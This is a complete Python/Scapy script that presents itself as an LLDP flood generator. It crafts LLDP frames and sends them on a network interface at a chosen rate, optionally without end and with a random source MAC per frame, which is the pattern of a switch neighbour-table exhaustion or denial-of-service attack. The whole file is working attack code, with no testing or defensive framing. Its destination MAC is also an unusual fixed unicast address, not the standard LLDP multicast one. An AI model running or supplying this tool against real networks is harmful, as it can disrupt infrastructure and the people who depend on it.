#!/usr/bin/env python3
"""LLDP flood generator implemented with Scapy."""

from __future__ import annotations

import argparse
import random
import sys
import time
from typing import Any

from scapy.all import Ether, Raw, get_if_hwaddr, sendp

LLDP_ETHERTYPE = 0x88CC
LLDP_DST_MAC = "38:84:79:00:ea:bc"


def encode_tlv(tlv_type: int, value: bytes) -> bytes:
    if tlv_type < 0 or tlv_type > 127:
        raise ValueError("LLDP TLV type must fit in 7 bits")
    if len(value) > 511:
        raise ValueError("LLDP TLV value must be at most 511 bytes")
    header = (tlv_type << 9) | len(value)
    return header.to_bytes(2, "big") + value


def mac_to_bytes(mac: str) -> bytes:
    return bytes.fromhex(mac.replace(":", ""))


def random_mac(rng: random.Random) -> str:
    first = (rng.randint(0, 255) | 0x02) & 0xFE
    rest = [rng.randint(0, 255) for _ in range(5)]
    return ":".join(f"{byte:02x}" for byte in [first, *rest])


def build_lldpdu(
    src_mac: str,
    chassis_id: str | None,
    port_id: str,
    ttl: int,
    system_name: str | None,
    system_desc: str | None,
) -> bytes:
    chassis_value = bytes([4]) + mac_to_bytes(chassis_id or src_mac)
    port_value = bytes([5]) + port_id.encode()
    ttl_value = int(ttl).to_bytes(2, "big")

    payload = bytearray()
    payload.extend(encode_tlv(1, chassis_value))
    payload.extend(encode_tlv(2, port_value))
    payload.extend(encode_tlv(3, ttl_value))
    if system_name:
        payload.extend(encode_tlv(5, system_name.encode()))
    if system_desc:
        payload.extend(encode_tlv(6, system_desc.encode()))
    payload.extend(encode_tlv(0, b""))
    return bytes(payload)


def build_frame(
    src_mac: str,
    chassis_id: str | None,
    port_id: str,
    ttl: int,
    system_name: str | None,
    system_desc: str | None,
) -> Any:
    return (
        Ether(src=src_mac, dst=LLDP_DST_MAC, type=LLDP_ETHERTYPE)
        / Raw(
            load=build_lldpdu(
                src_mac=src_mac,
                chassis_id=chassis_id,
                port_id=port_id,
                ttl=ttl,
                system_name=system_name,
                system_desc=system_desc,
            )
        )
    )


def main() -> int:
    parser = argparse.ArgumentParser(description="LLDP flood generator using Scapy")
    parser.add_argument("--iface", required=True, help="Interface to transmit on")
    parser.add_argument("--count", type=int, default=0, help="Frames to send, 0 means forever")
    parser.add_argument("--pps", type=float, default=100.0, help="Packets per second")
    parser.add_argument("--src-mac", help="Fixed source MAC, defaults to interface MAC")
    parser.add_argument("--randomize-src", action="store_true", help="Generate a random source MAC per frame")
    parser.add_argument("--chassis-id", help="Optional fixed chassis ID MAC")
    parser.add_argument("--port-id", default="eth0", help="LLDP port ID string")
    parser.add_argument("--ttl", type=int, default=120, help="LLDP TTL")
    parser.add_argument("--system-name", default="scapy-lldp", help="LLDP system name")
    parser.add_argument("--system-desc", default="Scapy LLDP flood generator", help="LLDP system description")
    parser.add_argument("--seed", type=int, help="Random seed")
    args = parser.parse_args()

    if args.pps <= 0:
        print("--pps must be greater than 0", file=sys.stderr)
        return 1
    if args.ttl < 0 or args.ttl > 65535:
        print("--ttl must be in 0..65535", file=sys.stderr)
        return 1

    base_src_mac = args.src_mac or get_if_hwaddr(args.iface)
    rng = random.Random(args.seed)
    interval = 1.0 / args.pps
    sent = 0

    print(
        f"Sending LLDP flood on {args.iface} dst={LLDP_DST_MAC} "
        f"pps={args.pps} count={'infinite' if args.count == 0 else args.count}"
    )

    try:
        while args.count == 0 or sent < args.count:
            src_mac = random_mac(rng) if args.randomize_src else base_src_mac
            frame = build_frame(
                src_mac=src_mac,
                chassis_id=args.chassis_id,
                port_id=args.port_id,
                ttl=args.ttl,
                system_name=args.system_name,
                system_desc=args.system_desc,
            )
            sendp(frame, iface=args.iface, verbose=False)
            sent += 1
            if sent <= 5 or sent % 100 == 0:
                print(f"sent={sent} src_mac={src_mac}")
            time.sleep(interval)
    except KeyboardInterrupt:
        pass
    except PermissionError:
        print("Permission denied. Run as root to send raw Ethernet frames.", file=sys.stderr)
        return 1

    print(f"done sent={sent}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())